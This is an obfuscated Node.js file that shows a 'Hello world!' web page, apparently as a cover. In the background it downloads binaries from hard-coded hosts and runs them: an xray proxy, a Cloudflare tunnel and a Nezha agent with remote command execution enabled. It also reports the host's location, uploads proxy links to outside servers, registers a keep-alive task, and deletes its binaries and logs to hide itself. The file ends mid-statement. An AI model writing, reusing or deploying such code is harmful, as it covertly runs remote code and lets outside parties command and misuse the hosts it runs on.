const _0x454b6d=_0xe6d4;(function(_0x47f65e,_0x477a97){const _0x5a0c2d=_0xe6d4,_0x5e96d3=_0x47f65e();while(!![]){try{const _0x38c0d8=-parseInt(_0x5a0c2d(0x256))/0x1+-parseInt(_0x5a0c2d(0x231))/0x2+-parseInt(_0x5a0c2d(0x277))/0x3+-parseInt(_0x5a0c2d(0x222))/0x4*(-parseInt(_0x5a0c2d(0x1f7))/0x5)+-parseInt(_0x5a0c2d(0x24e))/0x6*(-parseInt(_0x5a0c2d(0x2ae))/0x7)+parseInt(_0x5a0c2d(0x25e))/0x8*(-parseInt(_0x5a0c2d(0x254))/0x9)+parseInt(_0x5a0c2d(0x26b))/0xa;if(_0x38c0d8===_0x477a97)break;else _0x5e96d3['push'](_0x5e96d3['shift']());}catch(_0x46af50){_0x5e96d3['push'](_0x5e96d3['shift']());}}}(_0x283c,0xc03ea));const express=require('express'),app=express(),axios=require(_0x454b6d(0x2a2)),os=require('os'),fs=require('fs'),path=require(_0x454b6d(0x243)),{promisify}=require(_0x454b6d(0x286)),exec=promisify(require(_0x454b6d(0x259))[_0x454b6d(0x21b)]),{execSync}=require(_0x454b6d(0x259)),UPLOAD_URL=process[_0x454b6d(0x24b)][_0x454b6d(0x25b)]||'',PROJECT_URL=process[_0x454b6d(0x24b)][_0x454b6d(0x232)]||'',AUTO_ACCESS=process[_0x454b6d(0x24b)][_0x454b6d(0x288)]||![],FILE_PATH=process[_0x454b6d(0x24b)][_0x454b6d(0x1f9)]||_0x454b6d(0x27a),SUB_PATH=process[_0x454b6d(0x24b)][_0x454b6d(0x26e)]||'sub',PORT=process['env'][_0x454b6d(0x240)]||process['env']['PORT']||0xbb8,UUID=process['env'][_0x454b6d(0x26d)]||'90c1062f-0ffd-48ee-918d-e9848391daa3',NEZHA_SERVER=process[_0x454b6d(0x24b)][_0x454b6d(0x258)]||_0x454b6d(0x25d),NEZHA_PORT=process[_0x454b6d(0x24b)][_0x454b6d(0x241)]||_0x454b6d(0x26f),NEZHA_KEY=process[_0x454b6d(0x24b)][_0x454b6d(0x276)]||'',ARGO_DOMAIN=process['env'][_0x454b6d(0x289)]||'',ARGO_AUTH=process[_0x454b6d(0x24b)][_0x454b6d(0x291)]||'',ARGO_PORT=process['env'][_0x454b6d(0x1f4)]||0x1f41,CFIP=process[_0x454b6d(0x24b)][_0x454b6d(0x204)]||_0x454b6d(0x29e),CFPORT=process['env'][_0x454b6d(0x214)]||0x1bb,NAME=process[_0x454b6d(0x24b)][_0x454b6d(0x260)]||_0x454b6d(0x2af);!fs['existsSync'](FILE_PATH)?(fs[_0x454b6d(0x234)](FILE_PATH),console[_0x454b6d(0x2a9)](FILE_PATH+_0x454b6d(0x248))):console[_0x454b6d(0x2a9)](FILE_PATH+_0x454b6d(0x285));function generateRandomName(){const _0x48cfe3=_0x454b6d,_0x3357ec=_0x48cfe3(0x29c);let _0x49a0c7='';for(let _0x559124=0x0;_0x559124<0x6;_0x559124++){_0x49a0c7+=_0x3357ec[_0x48cfe3(0x218)](Math[_0x48cfe3(0x29b)](Math[_0x48cfe3(0x229)]()*_0x3357ec[_0x48cfe3(0x27d)]));}return _0x49a0c7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x454b6d(0x2b9)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x454b6d(0x2b9)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x454b6d(0x27e)),listPath=path[_0x454b6d(0x2b9)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x454b6d(0x29a)),configPath=path[_0x454b6d(0x2b9)](FILE_PATH,_0x454b6d(0x269));function _0xe6d4(_0x53fa7f,_0x32ca94){_0x53fa7f=_0x53fa7f-0x1f3;const _0x283cc4=_0x283c();let _0xe6d4a7=_0x283cc4[_0x53fa7f];return _0xe6d4a7;}function deleteNodes(){const _0x2df443=_0x454b6d;try{if(!UPLOAD_URL)return;if(!fs[_0x2df443(0x228)](subPath))return;let _0x2cbd0b;try{_0x2cbd0b=fs[_0x2df443(0x270)](subPath,_0x2df443(0x238));}catch{return null;}const _0x120513=Buffer['from'](_0x2cbd0b,_0x2df443(0x292))[_0x2df443(0x265)](_0x2df443(0x238)),_0x331eb9=_0x120513[_0x2df443(0x1f8)]('\x0a')['filter'](_0xe7d52c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xe7d52c));if(_0x331eb9[_0x2df443(0x27d)]===0x0)return;return axios[_0x2df443(0x1f6)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2df443(0x26c)]({'nodes':_0x331eb9}),{'headers':{'Content-Type':_0x2df443(0x24c)}})[_0x2df443(0x2a8)](_0xd7712c=>{return null;}),null;}catch(_0x300d4f){return null;}}function cleanupOldFiles(){const _0xf9cb4b=_0x454b6d;try{const _0x48e047=fs[_0xf9cb4b(0x283)](FILE_PATH);_0x48e047['forEach'](_0x114004=>{const _0x33f55f=_0xf9cb4b,_0x10d707=path[_0x33f55f(0x2b9)](FILE_PATH,_0x114004);try{const _0x3199ac=fs[_0x33f55f(0x210)](_0x10d707);_0x3199ac[_0x33f55f(0x255)]()&&fs[_0x33f55f(0x257)](_0x10d707);}catch(_0x21f9af){}});}catch(_0x55161c){}}app[_0x454b6d(0x21f)]('/',function(_0x4e8a49,_0x2b8317){const _0x10bf77=_0x454b6d;_0x2b8317[_0x10bf77(0x267)](_0x10bf77(0x25a));});async function generateConfig(){const _0x1dd6a3=_0x454b6d,_0x393eb0={'log':{'access':_0x1dd6a3(0x252),'error':_0x1dd6a3(0x252),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x1dd6a3(0x299)}],'decryption':_0x1dd6a3(0x2a0),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1dd6a3(0x28f)}},{'port':0xbb9,'listen':_0x1dd6a3(0x2a4),'protocol':_0x1dd6a3(0x20f),'settings':{'clients':[{'id':UUID}],'decryption':_0x1dd6a3(0x2a0)},'streamSettings':{'network':'tcp','security':_0x1dd6a3(0x2a0)}},{'port':0xbba,'listen':_0x1dd6a3(0x2a4),'protocol':_0x1dd6a3(0x20f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1dd6a3(0x2a0),'wsSettings':{'path':_0x1dd6a3(0x273)}},'sniffing':{'enabled':!![],'destOverride':[_0x1dd6a3(0x293),'tls',_0x1dd6a3(0x23c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1dd6a3(0x2a4),'protocol':_0x1dd6a3(0x249),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1dd6a3(0x275)}},'sniffing':{'enabled':!![],'destOverride':[_0x1dd6a3(0x293),_0x1dd6a3(0x251),_0x1dd6a3(0x23c)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x1dd6a3(0x236),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1dd6a3(0x2a0),'wsSettings':{'path':_0x1dd6a3(0x220)}},'sniffing':{'enabled':!![],'destOverride':[_0x1dd6a3(0x293),_0x1dd6a3(0x251),_0x1dd6a3(0x23c)],'metadataOnly':![]}}],'dns':{'servers':[_0x1dd6a3(0x2b1)]},'outbounds':[{'protocol':'freedom','tag':_0x1dd6a3(0x25f)},{'protocol':_0x1dd6a3(0x2b3),'tag':_0x1dd6a3(0x2a1)}]};fs[_0x1dd6a3(0x26a)](path[_0x1dd6a3(0x2b9)](FILE_PATH,'config.json'),JSON['stringify'](_0x393eb0,null,0x2));}function getSystemArchitecture(){const _0x3f192c=_0x454b6d,_0x577fd9=os[_0x3f192c(0x1fc)]();return _0x577fd9===_0x3f192c(0x225)||_0x577fd9==='arm64'||_0x577fd9===_0x3f192c(0x244)?_0x3f192c(0x225):'amd';}function downloadFile(_0x38c3c6,_0x52b964,_0x46d6ad){const _0x32049a=_0x454b6d,_0x30b7f0=_0x38c3c6;!fs[_0x32049a(0x228)](FILE_PATH)&&fs[_0x32049a(0x234)](FILE_PATH,{'recursive':!![]});const _0xf4be4a=fs[_0x32049a(0x2ad)](_0x30b7f0);axios({'method':_0x32049a(0x21f),'url':_0x52b964,'responseType':_0x32049a(0x27b)})[_0x32049a(0x205)](_0x3a1198=>{const _0xedc7a6=_0x32049a;_0x3a1198[_0xedc7a6(0x20a)][_0xedc7a6(0x268)](_0xf4be4a),_0xf4be4a['on']('finish',()=>{const _0x2be4d9=_0xedc7a6;_0xf4be4a[_0x2be4d9(0x28b)](),console[_0x2be4d9(0x2a9)]('Download\x20'+path[_0x2be4d9(0x278)](_0x30b7f0)+_0x2be4d9(0x284)),_0x46d6ad(null,_0x30b7f0);}),_0xf4be4a['on'](_0xedc7a6(0x2b8),_0x399c29=>{const _0x229f7e=_0xedc7a6;fs[_0x229f7e(0x206)](_0x30b7f0,()=>{});const _0x206543=_0x229f7e(0x2a5)+path[_0x229f7e(0x278)](_0x30b7f0)+'\x20failed:\x20'+_0x399c29[_0x229f7e(0x29f)];console[_0x229f7e(0x2b8)](_0x206543),_0x46d6ad(_0x206543);});})['catch'](_0x1a02ab=>{const _0x3bec3f=_0x32049a,_0x5809ce='Download\x20'+path['basename'](_0x30b7f0)+_0x3bec3f(0x203)+_0x1a02ab[_0x3bec3f(0x29f)];console[_0x3bec3f(0x2b8)](_0x5809ce),_0x46d6ad(_0x5809ce);});}async function downloadFilesAndRun(){const _0x1df729=_0x454b6d,_0x355686=getSystemArchitecture(),_0x1ea9b5=getFilesForArchitecture(_0x355686);if(_0x1ea9b5[_0x1df729(0x27d)]===0x0){console['log'](_0x1df729(0x23a));return;}const _0x3daf0f=_0x1ea9b5[_0x1df729(0x274)](_0x1b2ab7=>{return new Promise((_0x407dbf,_0xb8e24)=>{const _0x22d8b9=_0xe6d4;downloadFile(_0x1b2ab7[_0x22d8b9(0x266)],_0x1b2ab7[_0x22d8b9(0x2b7)],(_0x528f97,_0x6ae113)=>{_0x528f97?_0xb8e24(_0x528f97):_0x407dbf(_0x6ae113);});});});try{await Promise[_0x1df729(0x216)](_0x3daf0f);}catch(_0x40c515){console[_0x1df729(0x2b8)]('Error\x20downloading\x20files:',_0x40c515);return;}function _0x2423fe(_0x429869){const _0x11346f=_0x1df729,_0x2384f8=0x1fd;_0x429869[_0x11346f(0x272)](_0x1589b4=>{const _0x1a6662=_0x11346f;fs[_0x1a6662(0x228)](_0x1589b4)&&fs[_0x1a6662(0x2b2)](_0x1589b4,_0x2384f8,_0x4191e3=>{const _0x3112d5=_0x1a6662;_0x4191e3?console[_0x3112d5(0x2b8)](_0x3112d5(0x282)+_0x1589b4+':\x20'+_0x4191e3):console[_0x3112d5(0x2a9)]('Empowerment\x20success\x20for\x20'+_0x1589b4+':\x20'+_0x2384f8[_0x3112d5(0x265)](0x8));});});}const _0x181945=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2423fe(_0x181945);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2b6058=NEZHA_SERVER[_0x1df729(0x245)](':')?NEZHA_SERVER[_0x1df729(0x1f8)](':')['pop']():'',_0x405ff2=new Set([_0x1df729(0x28c),_0x1df729(0x217),_0x1df729(0x22e),_0x1df729(0x22d),_0x1df729(0x2b6),_0x1df729(0x28d)]),_0x1c7cdf=_0x405ff2[_0x1df729(0x2bb)](_0x2b6058)?'true':_0x1df729(0x20d),_0x1068fa=_0x1df729(0x271)+NEZHA_KEY+_0x1df729(0x226)+NEZHA_SERVER+_0x1df729(0x22a)+_0x1c7cdf+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1df729(0x26a)](path['join'](FILE_PATH,_0x1df729(0x24f)),_0x1068fa);const _0x5aafda=_0x1df729(0x25c)+phpPath+_0x1df729(0x239)+FILE_PATH+_0x1df729(0x24d);try{await exec(_0x5aafda),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x1a0093=>setTimeout(_0x1a0093,0x3e8));}catch(_0xdade6c){console[_0x1df729(0x2b8)](_0x1df729(0x200)+_0xdade6c);}}else{let _0x3904b4='';const _0x190854=[_0x1df729(0x28c),'8443',_0x1df729(0x22e),_0x1df729(0x22d),_0x1df729(0x2b6),_0x1df729(0x28d)];_0x190854[_0x1df729(0x245)](NEZHA_PORT)&&(_0x3904b4=_0x1df729(0x280));const _0x53c8e2=_0x1df729(0x25c)+npmPath+_0x1df729(0x29d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1df729(0x1f5)+NEZHA_KEY+'\x20'+_0x3904b4+_0x1df729(0x2aa);try{await exec(_0x53c8e2),console['log'](npmName+_0x1df729(0x2b5)),await new Promise(_0x2fc66e=>setTimeout(_0x2fc66e,0x3e8));}catch(_0x25ef20){console[_0x1df729(0x2b8)]('npm\x20running\x20error:\x20'+_0x25ef20);}}}else console[_0x1df729(0x2a9)](_0x1df729(0x287));const _0x323743='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x323743),console['log'](webName+_0x1df729(0x2b5)),await new Promise(_0x37208c=>setTimeout(_0x37208c,0x3e8));}catch(_0xb9fe4d){console[_0x1df729(0x2b8)](_0x1df729(0x207)+_0xb9fe4d);}if(fs[_0x1df729(0x228)](botPath)){let _0x59ec57;if(ARGO_AUTH[_0x1df729(0x296)](/^[A-Z0-9a-z=]{120,250}$/))_0x59ec57=_0x1df729(0x2ba)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x59ec57=_0x1df729(0x246)+FILE_PATH+_0x1df729(0x262):_0x59ec57='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1df729(0x221)+ARGO_PORT;try{await exec(_0x1df729(0x25c)+botPath+'\x20'+_0x59ec57+_0x1df729(0x27f)),console[_0x1df729(0x2a9)](botName+'\x20is\x20running'),await new Promise(_0x379fbf=>setTimeout(_0x379fbf,0x7d0));}catch(_0x423b9d){console['error'](_0x1df729(0x295)+_0x423b9d);}}await new Promise(_0x2a2de2=>setTimeout(_0x2a2de2,0x1388));}function getFilesForArchitecture(_0x5bcbb3){const _0x17187f=_0x454b6d;let _0x596e48;_0x5bcbb3===_0x17187f(0x225)?_0x596e48=[{'fileName':webPath,'fileUrl':_0x17187f(0x2ac)},{'fileName':botPath,'fileUrl':_0x17187f(0x211)}]:_0x596e48=[{'fileName':webPath,'fileUrl':_0x17187f(0x22b)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x237ee4=_0x5bcbb3===_0x17187f(0x225)?_0x17187f(0x264):_0x17187f(0x224);_0x596e48[_0x17187f(0x209)]({'fileName':npmPath,'fileUrl':_0x237ee4});}else{const _0x404c14=_0x5bcbb3===_0x17187f(0x225)?_0x17187f(0x261):_0x17187f(0x20c);_0x596e48[_0x17187f(0x209)]({'fileName':phpPath,'fileUrl':_0x404c14});}}return _0x596e48;}function argoType(){const _0xfa832f=_0x454b6d;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xfa832f(0x20b));return;}if(ARGO_AUTH[_0xfa832f(0x245)](_0xfa832f(0x279))){fs[_0xfa832f(0x26a)](path[_0xfa832f(0x2b9)](FILE_PATH,_0xfa832f(0x21c)),ARGO_AUTH);const _0x2917c3=_0xfa832f(0x2a6)+ARGO_AUTH[_0xfa832f(0x1f8)]('\x22')[0xb]+_0xfa832f(0x297)+path[_0xfa832f(0x2b9)](FILE_PATH,_0xfa832f(0x21c))+_0xfa832f(0x2a3)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0xfa832f(0x212);fs[_0xfa832f(0x26a)](path[_0xfa832f(0x2b9)](FILE_PATH,_0xfa832f(0x233)),_0x2917c3);}else console['log'](_0xfa832f(0x298));}async function extractDomains(){const _0x37bb40=_0x454b6d;let _0x127c36;if(ARGO_AUTH&&ARGO_DOMAIN)_0x127c36=ARGO_DOMAIN,console['log'](_0x37bb40(0x1fe),_0x127c36),await _0xa7a283(_0x127c36);else try{const _0x5c1a1a=fs['readFileSync'](path[_0x37bb40(0x2b9)](FILE_PATH,_0x37bb40(0x29a)),_0x37bb40(0x238)),_0x1154a7=_0x5c1a1a['split']('\x0a'),_0x3407ff=[];_0x1154a7[_0x37bb40(0x272)](_0x13b2aa=>{const _0x8e8e6c=_0x37bb40,_0x49f8aa=_0x13b2aa[_0x8e8e6c(0x296)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x49f8aa){const _0x5ada46=_0x49f8aa[0x1];_0x3407ff['push'](_0x5ada46);}});if(_0x3407ff[_0x37bb40(0x27d)]>0x0)_0x127c36=_0x3407ff[0x0],console[_0x37bb40(0x2a9)]('ArgoDomain:',_0x127c36),await _0xa7a283(_0x127c36);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x37bb40(0x257)](path[_0x37bb40(0x2b9)](FILE_PATH,_0x37bb40(0x29a)));async function _0x3b9532(){const _0x4d4d31=_0x37bb40;try{process[_0x4d4d31(0x23d)]==='win32'?await exec(_0x4d4d31(0x235)+botName+_0x4d4d31(0x22f)):await exec('pkill\x20-f\x20\x22['+botName[_0x4d4d31(0x218)](0x0)+']'+botName['substring'](0x1)+_0x4d4d31(0x237));}catch(_0x2f8bd3){}}_0x3b9532(),await new Promise(_0x3b6b87=>setTimeout(_0x3b6b87,0xbb8));const _0x346b88='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x37bb40(0x221)+ARGO_PORT;try{await exec(_0x37bb40(0x25c)+botPath+'\x20'+_0x346b88+_0x37bb40(0x27f)),console[_0x37bb40(0x2a9)](botName+'\x20is\x20running'),await new Promise(_0x2d0157=>setTimeout(_0x2d0157,0xbb8)),await extractDomains();}catch(_0x3069d9){console['error'](_0x37bb40(0x295)+_0x3069d9);}}}catch(_0x5bbc52){console['error'](_0x37bb40(0x219),_0x5bbc52);}async function _0x5f3ac5(){const _0xcce8fa=_0x37bb40;try{const _0x1cb7ce=await axios[_0xcce8fa(0x21f)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x1cb7ce[_0xcce8fa(0x20a)]&&_0x1cb7ce[_0xcce8fa(0x20a)]['country_code']&&_0x1cb7ce[_0xcce8fa(0x20a)]['org'])return _0x1cb7ce[_0xcce8fa(0x20a)][_0xcce8fa(0x23f)]+'_'+_0x1cb7ce[_0xcce8fa(0x20a)]['org'];}catch(_0x2a465c){try{const _0xf6c286=await axios['get'](_0xcce8fa(0x1ff),{'timeout':0xbb8});if(_0xf6c286[_0xcce8fa(0x20a)]&&_0xf6c286[_0xcce8fa(0x20a)][_0xcce8fa(0x23e)]==='success'&&_0xf6c286[_0xcce8fa(0x20a)][_0xcce8fa(0x21d)]&&_0xf6c286[_0xcce8fa(0x20a)][_0xcce8fa(0x1fa)])return _0xf6c286['data'][_0xcce8fa(0x21d)]+'_'+_0xf6c286[_0xcce8fa(0x20a)]['org'];}catch(_0xa3a936){}}return _0xcce8fa(0x27c);}async function _0xa7a283(_0x2003f7){const _0x70a41d=await _0x5f3ac5(),_0x575be7=NAME?NAME+'-'+_0x70a41d:_0x70a41d;return new Promise(_0x125be9=>{setTimeout(()=>{const _0x2bd1dc=_0xe6d4,_0x3a2fc1={'v':'2','ps':''+_0x575be7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2bd1dc(0x2a0),'net':'ws','type':_0x2bd1dc(0x2a0),'host':_0x2003f7,'path':_0x2bd1dc(0x20e),'tls':_0x2bd1dc(0x251),'sni':_0x2003f7,'alpn':'','fp':'firefox'},_0x1ea94a=_0x2bd1dc(0x1fb)+UUID+'@'+CFIP+':'+CFPORT+_0x2bd1dc(0x263)+_0x2003f7+_0x2bd1dc(0x294)+_0x2003f7+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x575be7+_0x2bd1dc(0x22c)+Buffer['from'](JSON['stringify'](_0x3a2fc1))['toString'](_0x2bd1dc(0x292))+_0x2bd1dc(0x202)+UUID+'@'+CFIP+':'+CFPORT+_0x2bd1dc(0x281)+_0x2003f7+'&fp=firefox&type=ws&host='+_0x2003f7+_0x2bd1dc(0x230)+_0x575be7+'\x0a\x20\x20\x20\x20';console[_0x2bd1dc(0x2a9)](Buffer[_0x2bd1dc(0x250)](_0x1ea94a)[_0x2bd1dc(0x265)](_0x2bd1dc(0x292))),fs[_0x2bd1dc(0x26a)](subPath,Buffer[_0x2bd1dc(0x250)](_0x1ea94a)[_0x2bd1dc(0x265)](_0x2bd1dc(0x292))),console[_0x2bd1dc(0x2a9)](FILE_PATH+_0x2bd1dc(0x28e)),uploadNodes(),app[_0x2bd1dc(0x21f)]('/'+SUB_PATH,(_0x4dd50a,_0x47e8de)=>{const _0x3a7f3f=_0x2bd1dc,_0x26ea30=Buffer[_0x3a7f3f(0x250)](_0x1ea94a)[_0x3a7f3f(0x265)](_0x3a7f3f(0x292));_0x47e8de[_0x3a7f3f(0x24a)]('Content-Type','text/plain;\x20charset=utf-8'),_0x47e8de['send'](_0x26ea30);}),_0x125be9(_0x1ea94a);},0x7d0);});}}async function uploadNodes(){const _0x960998=_0x454b6d;if(UPLOAD_URL&&PROJECT_URL){const _0x5b4fd4=PROJECT_URL+'/'+SUB_PATH,_0x59b0a3={'subscription':[_0x5b4fd4]};try{const _0x87a777=await axios[_0x960998(0x1f6)](UPLOAD_URL+'/api/add-subscriptions',_0x59b0a3,{'headers':{'Content-Type':'application/json'}});return _0x87a777&&_0x87a777[_0x960998(0x23e)]===0xc8?(console[_0x960998(0x2a9)](_0x960998(0x23b)),_0x87a777):null;}catch(_0x33d101){if(_0x33d101['response']){if(_0x33d101[_0x960998(0x208)][_0x960998(0x23e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x960998(0x228)](listPath))return;const _0x350f55=fs['readFileSync'](listPath,_0x960998(0x238)),_0x24569e=_0x350f55[_0x960998(0x1f8)]('\x0a')[_0x960998(0x227)](_0x40eb5b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x960998(0x2b4)](_0x40eb5b));if(_0x24569e['length']===0x0)return;const _0x5bb832=JSON[_0x960998(0x26c)]({'nodes':_0x24569e});try{const _0x4178d4=await axios[_0x960998(0x1f6)](UPLOAD_URL+'/api/add-nodes',_0x5bb832,{'headers':{'Content-Type':'application/json'}});return _0x4178d4&&_0x4178d4[_0x960998(0x23e)]===0xc8?(console[_0x960998(0x2a9)](_0x960998(0x290)),_0x4178d4):null;}catch(_0x57512a){return null;}}else return;}}function _0x283c(){const _0xfaaccf=['tls','/dev/null','Unhandled\x20error\x20in\x20startserver:','225CMxMUv','isFile','1342125fNHhVy','unlinkSync','NEZHA_SERVER','child_process','Hello\x20world!','UPLOAD_URL','nohup\x20','nezha.vexio.ggff.net:443','265504BLWRYV','direct','NAME','https://arm64.ssss.nyc.mn/v1','/tunnel.yml\x20run','?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/agent','toString','fileName','send','pipe','config.json','writeFileSync','17105180mvVOiS','stringify','UUID','SUB_PATH','lOPaJUbXQw8cCjC4fF8FImNC3jdVoG0l','readFileSync','\x0aclient_secret:\x20','forEach','/vless-argo','map','/vmess-argo','NEZHA_KEY','49239jVwGXC','basename','TunnelSecret','./tmp','stream','Unknown','length','sub.txt','\x20>/dev/null\x202>&1\x20&','--tls','?security=tls&sni=','Empowerment\x20failed\x20for\x20','readdirSync','\x20successfully','\x20already\x20exists','util','NEZHA\x20variable\x20is\x20empty,skip\x20running','AUTO_ACCESS','ARGO_DOMAIN','rm\x20-rf\x20','close','443','2053','/sub.txt\x20saved\x20successfully','tcp','Nodes\x20uploaded\x20successfully','ARGO_AUTH','base64','http','&fp=firefox&type=ws&host=','Error\x20executing\x20command:\x20','match','\x0a\x20\x20credentials-file:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','xtls-rprx-vision','boot.log','floor','abcdefghijklmnopqrstuvwxyz','\x20-s\x20','cdns.doon.eu.org','message','none','block','axios','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','127.0.0.1','Download\x20','\x0a\x20\x20tunnel:\x20','Error\x20in\x20startserver:','catch','log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/web','createWriteStream','7nNMFgt','galaxycloud','\x20>\x20nul\x202>&1','https+local://8.8.8.8/dns-query','chmod','blackhole','test','\x20is\x20running','2083','fileUrl','error','join','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','has','App\x20is\x20running','ARGO_PORT','\x20-p\x20','post','509195sBdJER','split','FILE_PATH','org','\x0avless://','arch','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_DOMAIN:','http://ip-api.com/json/','php\x20running\x20error:\x20','del\x20/f\x20/q\x20','\x0a\x0atrojan://','\x20failed:\x20','CFIP','then','unlink','web\x20running\x20error:\x20','response','unshift','data','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://amd64.ssss.nyc.mn/v1','false','/vmess-argo?ed=2560','vless','statSync','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','win32','CFPORT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','all','8443','charAt','Error\x20reading\x20boot.log:','push','exec','tunnel.json','countryCode','automatic\x20access\x20task\x20added\x20successfully','get','/trojan-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','32KbFzBb','clear','https://amd64.ssss.nyc.mn/agent','arm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','filter','existsSync','random','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/web','\x0a\x0avmess://','2087','2096','.exe\x20>\x20nul\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','1631978MtmlGL','PROJECT_URL','tunnel.yml','mkdirSync','taskkill\x20/f\x20/im\x20','trojan','\x22\x20>\x20/dev/null\x202>&1','utf-8','\x20-c\x20\x22','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Subscription\x20uploaded\x20successfully','quic','platform','status','country_code','SERVER_PORT','NEZHA_PORT','Add\x20automatic\x20access\x20task\x20faild:\x20','path','aarch64','includes','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','listen','\x20is\x20created','vmess','set','env','application/json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','7598586YJmDNv','config.yaml','from'];_0x283c=function(){return _0xfaaccf;};return _0x283c();}function cleanFiles(){setTimeout(()=>{const _0x43913a=_0xe6d4,_0x1d024f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1d024f[_0x43913a(0x21a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1d024f[_0x43913a(0x21a)](phpPath);process['platform']===_0x43913a(0x213)?exec(_0x43913a(0x201)+_0x1d024f[_0x43913a(0x2b9)]('\x20')+_0x43913a(0x2b0),_0x5a4e43=>{const _0x2b54ae=_0x43913a;console[_0x2b54ae(0x223)](),console[_0x2b54ae(0x2a9)]('App\x20is\x20running'),console[_0x2b54ae(0x2a9)](_0x2b54ae(0x215));}):exec(_0x43913a(0x28a)+_0x1d024f[_0x43913a(0x2b9)]('\x20')+_0x43913a(0x2ab),_0x1ace4d=>{const _0x312b4a=_0x43913a;console['clear'](),console[_0x312b4a(0x2a9)](_0x312b4a(0x1f3)),console[_0x312b4a(0x2a9)](_0x312b4a(0x215));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xfad53b=_0x454b6d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xfad53b(0x2a9)](_0xfad53b(0x1fd));return;}try{const _0x20cf86=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xfad53b(0x24c)}});return console['log'](_0xfad53b(0x21e)),_0x20cf86;}catch(_0x274794){return console[_0xfad53b(0x2b8)](_0xfad53b(0x242)+_0x274794[_0xfad53b(0x29f)]),null;}}async function startserver(){const _0x23fca2=_0x454b6d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 